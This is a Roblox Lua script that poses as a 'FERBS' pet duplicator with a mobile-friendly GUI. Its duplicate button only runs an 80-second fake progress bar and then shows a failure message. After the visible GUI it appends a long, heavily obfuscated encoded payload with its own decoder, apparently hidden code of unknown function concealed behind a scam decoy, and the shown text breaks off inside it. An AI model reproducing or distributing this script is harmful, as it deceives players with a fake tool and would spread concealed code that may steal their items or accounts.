local player = game:GetService("Players").LocalPlayer
local gui = Instance.new("ScreenGui")
gui.Name = "FerbsDuplicatorMobile"
gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

-- Mobile detection
local isMobile = game:GetService("UserInputService").TouchEnabled
local textSizeMultiplier = isMobile and 1.3 or 1

--= BLACK THEME =--
local function applyDarkTheme(frame)
    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 20)
    frame.BackgroundTransparency = 0.1
    
    local gradient = Instance.new("UIGradient")
    gradient.Color = ColorSequence.new({
        ColorSequenceKeypoint.new(0, Color3.fromRGB(25, 25, 30)),
        ColorSequenceKeypoint.new(1, Color3.fromRGB(10, 10, 15))
    })
    gradient.Rotation = 90
    gradient.Parent = frame
    
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 12)
    corner.Parent = frame
    
    return frame
end

--= MAIN FRAME (Responsive Sizing) =--
local mainFrame = Instance.new("Frame")
mainFrame.Name = "MainFrame"
mainFrame.Size = isMobile and UDim2.new(0.9, 0, 0, 350) or UDim2.new(0, 450, 0, 300)
mainFrame.Position = isMobile and UDim2.new(0.5, 0, 0.5, 0) or UDim2.new(0.5, -225, 0.5, -150)
mainFrame.AnchorPoint = isMobile and Vector2.new(0.5, 0.5) or Vector2.new(0, 0)
mainFrame = applyDarkTheme(mainFrame)
mainFrame.Parent = gui

--= FERBS WATERMARK (Mobile Optimized) =--
local ferbsWatermark = Instance.new("TextLabel")
ferbsWatermark.Name = "FerbsWatermark"
ferbsWatermark.Size = UDim2.new(0, 200 * (isMobile and 1.2 or 1), 0, 50 * (isMobile and 1.2 or 1))
ferbsWatermark.Position = UDim2.new(0.5, -100 * (isMobile and 1.2 or 1), 0.9, 0)
ferbsWatermark.Text = "FERBS"
ferbsWatermark.TextColor3 = Color3.fromRGB(0, 255, 255)
ferbsWatermark.BackgroundTransparency = 1
ferbsWatermark.Font = Enum.Font.GothamBlack
ferbsWatermark.TextSize = 28 * textSizeMultiplier
ferbsWatermark.TextStrokeTransparency = 0.5
ferbsWatermark.TextStrokeColor3 = Color3.fromRGB(0, 150, 150)
ferbsWatermark.ZIndex = 100
ferbsWatermark.Parent = gui

-- Wave animation
spawn(function()
    while true do
        for i = 0, 1, 0.1 do
            ferbsWatermark.Rotation = math.sin(i * math.pi * 4) * 5
            ferbsWatermark.TextTransparency = 0.3 + (i * 0.2)
            task.wait(0.05)
        end
        for i = 1, 0, -0.1 do
            ferbsWatermark.Rotation = math.sin(i * math.pi * 4) * 5
            ferbsWatermark.TextTransparency = 0.3 + (i * 0.2)
            task.wait(0.05)
        end
    end
end)

--= FLOATING FERBS TEXTS (Mobile Adjusted) =--
for i = 1, (isMobile and 5 or 8) do
    local floatingFerbs = Instance.new("TextLabel")
    floatingFerbs.Name = "FloatingFerbs_"..i
    floatingFerbs.Size = UDim2.new(0, (80 + math.random(-20,20)) * (isMobile and 1.2 or 1), 0, 30 * (isMobile and 1.2 or 1))
    floatingFerbs.Position = UDim2.new(math.random(), -40 * (isMobile and 1.2 or 1), math.random(0.1,0.8), -15 * (isMobile and 1.2 or 1))
    floatingFerbs.Text = "FERBS"
    floatingFerbs.TextColor3 = Color3.fromRGB(
        100 + math.random(0,155),
        100 + math.random(0,155),
        255
    )
    floatingFerbs.BackgroundTransparency = 1
    floatingFerbs.Font = Enum.Font.GothamBold
    floatingFerbs.TextSize = (14 + math.random(-2,4)) * textSizeMultiplier
    floatingFerbs.TextTransparency = 0.7
    floatingFerbs.ZIndex = 50
    floatingFerbs.Parent = gui
    
    spawn(function()
        local speed = 0.5 + math.random()
        local offset = math.random(1,10)
        while true do
            floatingFerbs.Position = UDim2.new(
                floatingFerbs.Position.X.Scale,
                floatingFerbs.Position.X.Offset,
                0.1 + (math.sin(tick()*speed + offset) * 0.1),
                floatingFerbs.Position.Y.Offset
            )
            floatingFerbs.TextTransparency = 0.5 + (math.sin(tick()*2 + i) * 0.3)
            task.wait()
        end
    end)
end

--= DUPLICATE BUTTON (Mobile Friendly) =--
local duplicateButton = Instance.new("TextButton")
duplicateButton.Name = "DuplicateButton"
duplicateButton.Size = UDim2.new(0.8, 0, 0, isMobile and 70 or 60)
duplicateButton.Position = UDim2.new(0.1, 0, 0.3, 0)
duplicateButton.Text = "DUPLICATE PET"
duplicateButton.TextColor3 = Color3.new(1, 1, 1)
duplicateButton.Font = Enum.Font.GothamBlack
duplicateButton.TextSize = 20 * textSizeMultiplier
duplicateButton.AutoButtonColor = false
duplicateButton.Parent = mainFrame

-- Button styling
local buttonCorner = Instance.new("UICorner")
buttonCorner.CornerRadius = UDim.new(0, 8)
buttonCorner.Parent = duplicateButton

local buttonStroke = Instance.new("UIStroke")
buttonStroke.Thickness = 3
buttonStroke.Color = Color3.fromRGB(0, 200, 200)
buttonStroke.Parent = duplicateButton

-- Button gradient
local buttonGradient = Instance.new("UIGradient")
buttonGradient.Color = ColorSequence.new({
    ColorSequenceKeypoint.new(0, Color3.fromRGB(0, 100, 150)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 150, 200))
})
buttonGradient.Rotation = 90
buttonGradient.Parent = duplicateButton

-- Touch support for mobile
if isMobile then
    local touchButtonEffect = Instance.new("Frame")
    touchButtonEffect.Name = "TouchEffect"
    touchButtonEffect.Size = UDim2.new(1, 0, 1, 0)
    touchButtonEffect.BackgroundColor3 = Color3.new(1, 1, 1)
    touchButtonEffect.BackgroundTransparency = 0.9
    touchButtonEffect.ZIndex = 10
    touchButtonEffect.Visible = false
    touchButtonEffect.Parent = duplicateButton
    
    duplicateButton.TouchTap:Connect(function()
        touchButtonEffect.Visible = true
        game:GetService("TweenService"):Create(
            touchButtonEffect,
            TweenInfo.new(0.3),
            {BackgroundTransparency = 1}
        ):Play()
        task.wait(0.3)
        touchButtonEffect.Visible = false
    end)
end

-- Button hover effects (desktop only)
if not isMobile then
    duplicateButton.MouseEnter:Connect(function()
        game:GetService("TweenService"):Create(
            buttonStroke,
            TweenInfo.new(0.2),
            {Color = Color3.fromRGB(0, 255, 255)}
        ):Play()
    end)

    duplicateButton.MouseLeave:Connect(function()
        game:GetService("TweenService"):Create(
            buttonStroke,
            TweenInfo.new(0.2),
            {Color = Color3.fromRGB(0, 200, 200)}
        ):Play()
    end)
end

--= FULLSCREEN LOADING SCREEN (Mobile Optimized) =--
local loadingFrame = Instance.new("Frame")
loadingFrame.Name = "LoadingFrame"
loadingFrame.Size = UDim2.new(1, 0, 1, 0)
loadingFrame.Position = UDim2.new(0, 0, 0, 0)
loadingFrame.BackgroundColor3 = Color3.fromRGB(5, 5, 10)
loadingFrame.BackgroundTransparency = 0.05
loadingFrame.Visible = false
loadingFrame.ZIndex = 100
loadingFrame.Parent = gui

-- Loading text (mobile responsive)
local loadingText = Instance.new("TextLabel")
loadingText.Name = "LoadingText"
loadingText.Size = isMobile and UDim2.new(0.9, 0, 0, 250) or UDim2.new(0.8, 0, 0, 150)
loadingText.Position = isMobile and UDim2.new(0.05, 0, 0.2, 0) or UDim2.new(0.1, 0, 0.3, 0)
loadingText.Text = "🔍 Searching for low-pop server...\n\n• Works on: Dragonfly, Queen Bee, Disco Bee, Red Fox, Raccoon, Butterfly\n• Doesn't work on fruits or low-tier pets\n\nPlease wait while we find the best server..."
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.BackgroundTransparency = 1
loadingText.Font = Enum.Font.GothamBold
loadingText.TextSize = 16 * textSizeMultiplier
loadingText.TextXAlignment = Enum.TextXAlignment.Left
loadingText.TextYAlignment = Enum.TextYAlignment.Top
loadingText.TextWrapped = true
loadingText.Parent = loadingFrame

-- Loading bar (thicker on mobile)
local loadingBar = Instance.new("Frame")
loadingBar.Name = "LoadingBar"
loadingBar.Size = isMobile and UDim2.new(0.9, 0, 0, 20) or UDim2.new(0.8, 0, 0, 15)
loadingBar.Position = isMobile and UDim2.new(0.05, 0, 0.6, 0) or UDim2.new(0.1, 0, 0.6, 0)
loadingBar.BackgroundColor3 = Color3.fromRGB(50, 50, 80)
loadingBar.Parent = loadingFrame

local loadingBarFill = Instance.new("Frame")
loadingBarFill.Name = "LoadingBarFill"
loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
loadingBarFill.BackgroundColor3 = Color3.fromRGB(0, 200, 255)
loadingBarFill.Parent = loadingBar

-- Loading percentage (bigger on mobile)
local percentText = Instance.new("TextLabel")
percentText.Name = "PercentText"
percentText.Size = UDim2.new(0, 100 * (isMobile and 1.3 or 1), 0, 40 * (isMobile and 1.3 or 1))
percentText.Position = UDim2.new(0.5, -50 * (isMobile and 1.3 or 1), 0.5, -20 * (isMobile and 1.3 or 1))
percentText.Text = "0%"
percentText.TextColor3 = Color3.new(1, 1, 1)
percentText.Font = Enum.Font.GothamBlack
percentText.TextSize = 30 * textSizeMultiplier
percentText.BackgroundTransparency = 1
percentText.Parent = loadingFrame

--= DUPLICATE FUNCTION (Mobile Compatible) =--
local function startDuplication()
    loadingFrame.Visible = true
    loadingBarFill.Size = UDim2.new(0, 0, 1, 0)
    
    local duration = 80
    local startTime = tick()
    
    local connection
    connection = game:GetService("RunService").Heartbeat:Connect(function()
        local progress = math.min((tick() - startTime) / duration, 1)
        
        loadingBarFill.Size = UDim2.new(progress, 0, 1, 0)
        percentText.Text = math.floor(progress * 100) .. "%"
        
        if progress >= 1 then
            connection:Disconnect()
            
            -- Success message (mobile responsive)
            local successText = Instance.new("TextLabel")
            successText.Text = "❌ Please make sure you followed all the requirements, or there might be a connection issue"
            successText.Size = isMobile and UDim2.new(0.9, 0, 0, 80) or UDim2.new(0.8, 0, 0, 50)
            successText.Position = isMobile and UDim2.new(0.05, 0, 0.7, 0) or UDim2.new(0.1, 0, 0.7, 0)
            successText.TextColor3 = Color3.fromRGB(0, 255, 0)
            successText.Font = Enum.Font.GothamBlack
            successText.TextSize = 22 * textSizeMultiplier
            successText.BackgroundTransparency = 0.8
            successText.TextWrapped = true
            successText.Parent = loadingFrame
            
            task.wait(10)
            loadingFrame.Visible = false
            successText:Destroy()
        end
    end)
end

-- Connect both mouse and touch inputs
duplicateButton.MouseButton1Click:Connect(startDuplication)
if isMobile then
    duplicateButton.TouchTap:Connect(startDuplication)
end

return(function(...)local p={"\108\054\103\107\070\049\043\053";"\120\054\069\102\109\056\070\073\077\083\061\061","\055\111\043\053\070\055\110\047\048\049\103\102\077\049\071\061","\116\102\099\105\070\065\079\066\116\099\061\061";"\108\052\110\098\104\082\069\067";"\097\121\097\098\080\076\066\087\083\105\047\070\116\055\080\057\085\083\061\061","\122\102\121\074\122\083\100\068\048\113\085\120\103\118\077\057\075\076\083\081\110\120\043\083\075\070\069\073\043\099\072\102\088\071\122\050\101\066\088\111\087\083\117\114\068\119\098\047\074\066\090\065\067\103\121\090\106\111\074\101\112\098\109\068\086\115\069\047\075\084\081\050\112\120\116\085\116\086\086\065\107\106\084\057\050\084\108\050\078\111\049\106\087\080\117\116\087\099\088\084\071\103\079\090\107\054\055\104\056\067\098\097\122\082\078\067\075\065\051\067\085\109\049\070\117\082\057\098\065\106\116\065\116\043\089\116\074\057\090\102\081\121\090\056\081\086\099\105\111\048\076\099\052\099\101\116\067\122\055\103\118\110\043\089\052\069\101\077\114\110\053\070\114\104\115\071\053\077\109\085\050\112\086\100\050\107\120\089\043\102\074\098\071\086\106\053\109\052\115\105\054\074\118\083\120\049\047\117\107\088\097\117\079\122\073\070\122\087\068\075\114\051\053\069\070\108\104\057\043\098\102\080\117\097\072\120\086\077\090\051\072\116\109\099\081\087\054\103\115\101\107\066\082\104\079\057\117\105\072\083\066\099\115\118\105\056\089\113\068\049\050\117\048\057\112\080\052\100\061\061","\048\082\069\050\090\082\075\057";"\110\078\073\073\070\076\070\098\120\082\048\052","\110\101\047\056\082\055\110\081\108\100\061\061";"\071\076\066\090\104\111\110\051\070\056\075\109";"\108\118\047\116\097\067\048\076\085\054\066\057\108\076\047\103","\080\078\088\070\048\121\080\070\097\055\097\078\082\071\047\105";"\110\101\088\082\110\103\079\121\075\101\043\117\077\101\075\069\120\100\061\061";"\112\055\089\088\121\047\079\112\113\054\112\077\101\086\099\112\098\117\086\066\084\099\102\074\098\055\107\098\056\056\105\070\086\070\080\076\048\081\083\101\055\052\101\061","\070\084\088\105\075\120\105\088\120\054\080\052\108\101\110\104\048\100\061\061";"\099\054\083\073\097\047\102\073\065\105\116\109\089\083\061\061","\090\067\105\121\070\083\061\061";"\109\056\110\121\108\076\048\105\048\100\061\061","\085\067\113\076\110\080\108\121\083\111\101\098\097\080\066\084\071\051\083\061";"\108\054\080\053\077\052\070\105","\090\071\105\083\077\121\053\054\082\056\066\083\070\055\110\083","\048\049\043\107\048\082\111\102\070\055\119\061";"\055\111\043\114\070\082\068\061";"\077\082\103\121\104\100\061\061";"\048\049\103\102\077\049\071\061";"";"\090\078\043\107\090\078\103\121","\120\076\070\083\083\082\103\104\120\082\099\052\077\076\053\088\104\099\061\061","\070\078\111\047\048\049\075\079","\116\099\061\061","\055\111\043\067\090\050\061\061","\070\078\103\053\070\083\061\061";"\090\078\047\047\108\099\061\061";"\080\049\103\053\108\049\080\098\119\076\110\105\048\049\080\051\048\049\080\101\119\083\061\061";"\077\049\043\047\070\056\075\121\108\054\105\107\070\050\061\061","\080\080\088\097","\070\052\075\111\090\099\061\061","\055\111\043\066\077\054\110\105\085\100\061\061";"\116\107\108\090\114\054\085\106\115\102\118\118\102\074\122\043\109\110\068\057\109\067\097\047\073\118\113\089\114\084\107\118\120\117\122\085\114\067\077\097\109\104\113\056\050\111\119\105\073\071\101\052\082\108\076\081\105\056\104\101\081\054\114\071\104\108\085\056\073\112\071\118\043\110\119\078\102\118\068\112\107\118\121\118\106\054\105\076\083\120\089\069\102\071\077\047\122\119\099\105\050\120\054\108\087\106\083\119\104\090\109\057\043\050\073\068\099\120\065\074\103\104\084\068\119\088\054\071\099\048\076\090\065\110\117\065\085\049\118\079\116\108\069\067\100\090\079\069\116\084\108\081\114\075\111\090\115\111\102\082\084\087\087\090\072\117\068\098\106\065\057\100\065\100\108\083\121\111\114\069\112\056\050\073\104\103\114\067\084\075\049\103\115\100\122\050\109\111\100\047\082\118\108\084\100\102\076\077\086\065\083\067\113\086\074\066\068\113\073\087\100\121\065\072\065\074\117\076\116\086\070\104\074\122\121\077\081\119\043\069\110\116\049\122\102\080\108\106\121\117\114\077\122\111\118\101\107\105\057\056\104\100\066\101\114\107\053\117\048\052\102\089\086\077\087\109\105\083\061\061";"\077\084\076\061","\108\049\075\047\077\049\050\061";"\080\055\075\105\108\054\069\047\077\082\071\061";"\070\055\088\098\077\052\119\061";"\077\084\119\061","\077\049\080\107";"\108\078\080\121\077\082\080\121\090\055\110\047\090\054\073\105";"\097\120\047\078\082\067\080\118\116\080\048\089\077\049\053\113","\116\084\103\115\090\052\047\102\075\080\048\088\083\071\069\051\083\051\101\061","\080\078\080\102\104\049\043\115\104\050\061\061","\048\049\043\118\048\056\088\066\077\054\108\061";"\070\054\073\115\077\052\119\061","\071\052\080\056\077\078\108\050\108\055\113\101\116\071\080\070\077\083\061\061"}for E,I in ipairs({{-583025-(-583026);-277044-(-277097)},{-688116-(-688117),754395-754359};{-394887-(-394924);-924872-(-924925)}})do while I[953407-953406]<I[-474159+474161]do p[I[643892+-643891]],p[I[976128-976126]],I[550193+-550192],I[-703476-(-703478)]=p[I[695800-695798]],p[I[-186405-(-186406)]],I[6688+-6687]+(393709-393708),I[264554-264552]-(649525-649524)end end local function E(E)return p[E-(-476658-(-539313))]end do local E={i=-167781+167818,["\048"]=-527280+527309;f=-510448+510482,I=1034097-1034048,J=693204-693173,w=110947+-110939,y=-627315+627367,j=-961342+961404,x=-449051-(-449070);R=203708-203686,["\054"]=-569036-(-569074);S=-567970-(-567986);g=775101-775096;E=-754622-(-754679);z=-23122-(-23137);M=-881339+881366,["\051"]=623411+-623376;P=-246120+246141,X=615731+-615722,Q=-647978-(-647988),b=437678+-437628,A=227111+-227109;l=884411+-884383,e=609395+-609359;L=247912+-247908;["\050"]=800361-800313,T=-710774+710777,m=764426-764408,["\055"]=638452+-638429,O=-86563+86603;F=245224+-245199,q=554354-554353;["\056"]=-166238-(-166245),B=-907411-(-907452);p=-379121-(-379180),r=417433-417389;W=-822778+822789,Z=444422-444398;n=336443-336426,K=-1011570-(-1011583);N=-233511+233565,V=-711478+711538;v=-640564+640615,["\049"]=397618-397612;G=-776036-(-776056);a=567794+-567782;["\047"]=-359498-(-359531),h=813881+-813855;t=726853-726839;C=642587-642548,o=917884+-917831;["\053"]=-873147+873192,k=-765688+765734,c=857723+-857691;U=-134500+134530;["\057"]=112398-112355;["\043"]=-1019776+1019837,["\052"]=782008+-781953,D=-350643-(-350699);u=447470+-447412;H=-95203+95266,Y=-242686-(-242728);d=645492+-645492,s=-677109+677156}local I=table.insert local g=type local L=string.sub local N=math.floor local G=string.len local A=p local l=string.char local j=table.concat for p=803130-803129,#A,794938-794937 do local a=A[p]if g(a)=="\115\116\114\105\110\103"then local g=G(a)local W={}local d=-349482-(-349483)local J=948925-948925 local V=904060+-904060 while d<=g do local p=L(a,d,d)local G=E[p]if G then J=J+G*(-678389+678453)^((793212-793209)-V)V=V+(369771+-369770)if V==-577838-(-577842)then V=-955646+955646 local p=N(J/(531054-465518))local E=N((J%(-357421-(-422957)))/(-36641+36897))local g=J%(-311722+311978)I(W,l(p,E,g))J=-183974-(-183974)end elseif p=="\061"then I(W,l(N(J/(-736441-(-801977)))))if d>=g or L(a,d+(450734+-450733),d+(975038+-975037))~="\061"then I(W,l(N((J%(829882+-764346))/(166053-165797))))end break end d=d+(618675+-618674)end A[p]=j(W)end end end return(function(p,g,L,N,G,A,l,K,j,X,W,U,h,d,x,s,c,V,I,F,J,a)s,K,I,x,d,h,W,c,j,X,a,U,F,V,J=function(p,E)local g=J(E)local L=function(L)return I(p,{L},E,g)end return L end,function(p,E)local g=J(E)local L=function(...)return I(p,{...},E,g)end return L end,function(I,L,N,G)local J,O,z,k,y,Y,q,Q,P,o,r,f,n,v,S,i,m,B,K,C,d,Z,R,a,b,t,D,T,V,e,u,w,l,H while I do if I<-947645+8455599 then if I<3265751-(-306345)then if I<495215+940919 then if I<-647476+1392476 then if I<868731+-437436 then if I<960230-578930 then if I<831355-598643 then I=j[N[-758064-(-758071)]]I=I and-852730+3180353 or 4243041-626163 else a=L z=E(168101+-105421)I=true J=E(-923927-(-986623))d=W()j[d]=I l=p[J]J=E(626749-564081)I=l[J]V=W()J=W()K=W()i=U(721910+4341924,{K})j[J]=I I=h(1434572-58786,{})j[V]=I I=false j[K]=I S=p[z]z=S(i)I=z and 3947928-(-401132)or-547249+9113782 l=z end else b=x(b)m=x(m)P=x(P)I=3518538-(-858171)Q=x(Q)u=x(u)T=nil e=x(e)end else if I<1157676-588338 then d=j[N[312492-312490]]I=125156+12655778 J=j[N[-416621+416624]]a=d==J l=a else l=-798713+4422760 d=E(467801-405101)J=-994559+10992177 a=d^J I=l-a a=I l=E(-950013+1012714)I=l/a l={I}I=p[E(-51955-(-114660))]end end else if I<-753271+1756340 then if I<1163362-307498 then I=w l=r I=r and 15331764-(-307242)or-461358+3635855 else Y=R==q v=Y I=1412043-(-78434)end else if I<-479919+1702251 then w=w+R H=not q i=w<=r i=H and i H=w>=r H=q and H i=H or i H=11990926-(-413165)I=i and H i=12995180-(-672565)I=I or i else l=E(-1002303+1064985)I=p[l]a=E(105778-43105)l=I(a)I=p[E(318491-255784)]l={}end end end else if I<-57634+2384328 then if I<2861852-812985 then if I<1249788-(-664629)then if I<601395+858821 then I=true I=I and-569458+14472731 or 14021964-(-808057)else j[d]=v I=j[d]I=I and 11168244-(-569202)or 373804+10268441 end else l=13921034-747895 J=6660780-587250 d=E(-843130+905832)a=d^J I=l-a a=I l=E(-385900+448593)I=l/a l={I}I=p[E(-462629-(-525296))]end else if I<2269070-103331 then n=E(-157797+220480)I=p[n]n=E(428717+-366038)p[n]=I I=780280+1771606 else f=#H n=-924925+924925 I=721590+13272821 D=f==n end end else if I<-375660+2992566 then if I<2834189-428973 then a=E(889108-826426)I=p[a]J=-952062+952062 d=j[N[-465262+465270]]a=I(d,J)I=3502666-(-114212)else I=-120164+10823851 end else if I<3189848-481647 then O=401836+-401835 n=797881+-797875 I=j[z]Y=I(O,n)n=E(-191206+253889)I=E(236967+-174284)p[I]=Y O=p[n]n=-455342+455344 I=O>n I=I and 6085274-676853 or-493359+2628464 else w=E(-720374+783073)r=p[w]I=16165710-526704 l=r end end end end else if I<4777480-70178 then if I<4191997-(-159845)then if I<3220681-(-722358)then if I<4697814-929149 then if I<2745558-(-995327)then I={}J=j[N[-177317+177326]]V=J a=I I=8346591-750839 J=-308522+308523 d=-715829-(-715830)K=J J=720310+-720310 S=K<J J=d-K else f=#H n=553393-553393 D=f==n I=D and 1015295+8102679 or 908540+13085871 end else f=f+b Q=not m D=f<=n D=Q and D Q=f>=n Q=m and Q D=Q or D Q=7939090-(-192230)I=D and Q D=550513+1725908 I=I or D end else if I<-831994+5121200 then l={}I=p[E(869528-806841)]else I=9144695-578162 S=j[K]l=S end end else if I<5042135-553777 then if I<5271319-876347 then v=v+O l=v<=Y b=not n l=b and l b=v>=Y b=n and b l=b or l b=1029568+10712487 I=l and b l=149797+11147828 I=I or l else J=E(23847-(-38817))d=p[J]J=E(501809-439150)I=p[E(1096770-1034112)]a=d[J]J=j[N[-450221-(-450222)]]d={a(J)}l={g(d)}end else if I<39649+4586776 then H=E(-37083-(-99747))q=p[H]I=84835+698548 H=E(-222974-(-285673))R=q[H]r=R else Z=-161317+161318 j[d]=t B=j[P]k=B+Z C=T[k]o=R+C C=-101219+101475 I=o%C k=j[Q]R=I I=-512496-(-916988)C=q+k k=-474799-(-475055)o=C%k q=o end end end else if I<5774133-742135 then if I<-990783+5971476 then if I<582578+4296578 then if I<5488149-664565 then I=true I=I and 63266+9476609 or 5463366-591026 else I=p[E(565492-502832)]l={}end else o=I B=-39777+39778 k=T[B]B=false C=k==B t=C I=C and-823098+10484833 or 4976567-(-52962)end else if I<-345835+5365711 then V=-837050+837051 K=301163-301161 d=j[N[-954558+954559]]J=d(V,K)d=-772536+772537 a=J==d l=a I=a and 13028206-247272 or 1179844-645300 else l=t I=o I=633908+12939627 end end else if I<6844954-(-25761)then if I<4769931-(-595058)then I=true l={}j[N[-19425+19426]]=I I=p[E(-299458-(-362155))]else O=E(748566-685877)b=E(307327-244648)I=p[O]n=p[b]O=I(n)I=E(989887+-927204)p[I]=O I=-827386+3379272 end else if I<8062112-1019712 then d=j[N[650230-650228]]J=-422400-(-422637)a=d*J d=-147301+33640284371398 l=a+d d=84451+-84450 a=35184371064640-(-1024192)I=l%a j[N[-977982+977984]]=I a=j[N[213930-213927]]I=28129+7045879 l=a~=d else I=-802617+14541021 J=-982270+982479 d=j[N[973758+-973755]]a=d*J d=-250344+250601 l=a%d j[N[-120100+120103]]=l end end end end end else if I<-225447+12049765 then if I<611827+9136837 then if I<9534749-558769 then if I<-991039+9472036 then if I<-511216+8629473 then if I<8087782-162469 then J=J+K z=not S d=J<=V d=z and d z=J>=V z=S and z d=z or d z=518576+10525601 I=d and z d=-452398+15642878 I=I or d else a=L[189414+-189413]I=j[N[507697-507696]]J=I d=L[-705396-(-705398)]I=J[d]I=I and 13004077-(-470127)or 10413662-268072 end else D=f I=3402312-(-424493)Q=D H[D]=Q D=nil end else if I<730679+7957213 then z=E(-148768-(-211431))i=E(-750833-(-813497))S=l l=p[z]q=E(-4000+66664)z=E(-677621+740313)I=l[z]z=W()j[z]=I l=p[i]i=E(607931-545265)I=l[i]w=I R=p[q]i=I I=R and 3561996-(-1038976)or-248937-(-1032320)r=R else d=j[N[725817-725814]]r=-1012031+1012033 J=653300+-653268 R=246901-246888 a=d%J V=j[N[-444138-(-444142)]]z=j[N[1008831+-1008829]]D=j[N[-658673-(-658676)]]H=D-a D=-957918-(-957950)q=H/D w=R-q i=r^w S=z/i K=V(S)V=4295230568-263272 i=504304+-504303 J=K%V K=968446+-968444 V=K^a d=J/V V=j[N[695866-695862]]z=d%i i=151461+4294815835 S=z*i K=V(S)V=j[N[231083-231079]]S=V(d)J=K+S K=-471023+536559 V=J%K a=nil S=J-V z=934331-868795 K=S/z z=-650164-(-650420)r=355755+-355499 S=V%z R=905212-904956 i=V-S z=i/r r=690997-690741 V=nil d=nil i=K%r J=nil I=844858+3598413 w=K-i r=w/R w={S;z,i;r}j[N[-670837+670838]]=w K=nil S=nil i=nil r=nil z=nil end end else if I<9871359-355051 then if I<8501181-(-726327)then m=E(439049-376364)f=W()D={}n=F(10249625-336490,{f;r;w;K})C=nil j[f]=D e=E(32052-(-30625))b=W()V=nil T=E(-697014+759708)R=nil K=x(K)z=nil D=W()Q={}j[D]=n S=nil n={}j[b]=n n=p[m]l={}u=j[b]P={[e]=u,[T]=C}m=n(Q,P)n=U(8596583-598899,{b;f,q;r;w,D})H=nil d=m I=p[E(904408-841722)]S=E(418527-355819)q=x(q)r=x(r)z=17146032259506-(-441518)f=x(f)J=n b=x(b)D=x(D)K=J(S,z)H=E(-951145-(-1013823))i=nil i=422189+15263705417306 V=d[K]w=x(w)K=E(503111-440430)p[K]=V z=E(-403885+466591)w=E(721923-659252)S=J(z,i)K=d[S]i=E(217383+-154685)r=2538403605098-467246 S=E(991005-928317)p[S]=K z=J(i,r)S=d[z]i=E(-619171-(-681845))z=E(-110418-(-173093))p[z]=S z=p[i]r=p[w]D=135652+9848660431344 q=J(H,D)R=d[q]q=E(572530+-509873)d=nil J=nil q=r[q]w={q(r,R)}i=z(g(w))z=i()else a=nil j[N[531893-531888]]=l I=859130-634356 end else if I<-456238+10045821 then a=E(-944509+1007188)l=E(-830881-(-893564))I=p[l]l=p[a]a=E(419245+-356566)p[a]=I a=E(-866210-(-928893))I=-131236+4842804 p[a]=l a=j[N[-533745+533746]]d=a()else I=818553+4210976 B=-423531-(-423533)k=T[B]B=j[u]C=k==B t=C end end end else if I<-607731+11619644 then if I<9432870-(-841466)then if I<-85347+10001334 then if I<-955774+10854899 then o=j[d]t=o I=o and 12795047-907580 or-751671+5440710 else a=j[N[-98210-(-98211)]]l=#a a=-360619+360619 I=l==a I=I and 6323425-(-713206)or-536049+4979320 end else I={}j[N[10146-10144]]=I i=E(394450-331754)l=j[N[-660660+660663]]K=-83491+35184372172323 z=444845-444590 I=558385-(-465134)w=-277225+277226 V=l l=d%K j[N[808185+-808181]]=l S=d%z z=101093-101091 K=S+z j[N[-300585+300590]]=K z=p[i]i=E(-829792-(-892476))R=w w=981886+-981886 S=z[i]z=S(a)S=E(-862203+924868)i=555505+-555504 J[d]=S r=z q=R<w w=i-R S=543723-543665 end else if I<9995454-(-691573)then I=true I=-351403+15181424 else I=true I=I and 2897016-207910 or 3501898-(-585522)end end else if I<11145717-(-234471)then if I<11933871-836346 then I=j[N[-832249-(-832250)]]r=132835-132580 i=-962238-(-962238)z=I(i,r)I=8404961-809209 d=J a[d]=z d=nil else Y=j[d]v=Y I=Y and-739639+1735509 or 2315175-824698 end else if I<-565042+12305523 then I=13586110-(-701174)else m=E(881787+-819124)b=W()j[b]=v C=E(-387469-(-450158))l=p[m]Q=793657+-793557 m=E(903646-840954)I=l[m]m=1030144+-1030143 l=I(m,Q)m=W()P=-952703-(-952958)Z=-523440+523440 y=134308+-124308 j[m]=l Q=-221415-(-221415)I=j[z]l=I(Q,P)Q=W()P=640501-640500 j[Q]=l I=j[z]e=j[m]l=I(P,e)P=W()j[P]=l u=566131-566130 l=j[z]T=-548591-(-548593)e=l(u,T)l=837946+-837945 I=e==l e=W()l=E(13829-(-48866))T=E(61986+683)j[e]=I o=p[C]k=j[z]B={k(Z,y)}C=o(g(B))o=E(-30817+93486)I=E(-741605-(-804281))I=D[I]t=C..o u=T..t I=I(D,l,u)u=W()j[u]=I T=E(209510+-146830)t=s(-197606+5211775,{z,b;w;J,d,f,e;u,m;P,Q;r})l=p[T]T={l(t)}I={g(T)}T=I I=j[e]I=I and 13147122-116836 or 10058579-201254 end end end end else if I<-806841+14293314 then if I<-663349+13689231 then if I<-567794+13177042 then if I<167909+12278081 then if I<-860219+12758471 then C=204967-204966 I=-919741+5608780 o=T[C]t=o else O=E(124772+-62076)i=w Y=p[O]O=E(-146405+209061)v=Y[O]Y=v(a,i)i=nil v=j[N[407661+-407655]]O=v()f=Y+O D=f+S f=-376556-(-376812)H=D%f O=-432429+432430 f=J[d]S=H Y=S+O v=V[Y]I=-811001+1834520 D=f..v J[d]=D end else l=E(-97184-(-159845))r=X(-222567+2179490,{})I=p[l]V=E(-103843+166532)a=j[N[976702+-976698]]i=E(830160-767480)J=p[V]z=p[i]i={z(r)}z=941949+-941947 S={g(i)}K=S[z]V=J(K)J=E(104392-41697)d=a(V,J)a={d()}l=I(g(a))a=l d=j[N[48610+-48605]]I=d and 1043968+11969933 or 9755466-262184 l=d end else if I<-710326+13717743 then I=l and 11542400-(-1045504)or-193446+418220 else J=j[N[81577-81571]]d=J==a l=d I=9781323-288041 end end else if I<13968188-859451 then if I<762936+12292677 then t=j[d]I=t and 4722608-(-231655)or-16417+13589952 l=t else I=-340011+5051579 end else if I<-752759+13953379 then I=p[E(-132836+195527)]l={d}else I=12388058-(-775352)end end end else if I<-107939+14362135 then if I<12760576-(-1015615)then if I<-757879+14429530 then if I<13488305-(-100771)then j[d]=l I=-212071-(-616563)else V=nil z=nil I=694262+12469148 S=nil end else J=482159+-482158 d=j[N[-626544-(-626547)]]a=d~=J I=a and 9677960-781176 or 87779+6986229 end else if I<13955083-39585 then I=-663093+11366780 else f=-413292-(-413293)n=#H D=V(f,n)f=S(H,D)Q=301866-301865 D=nil 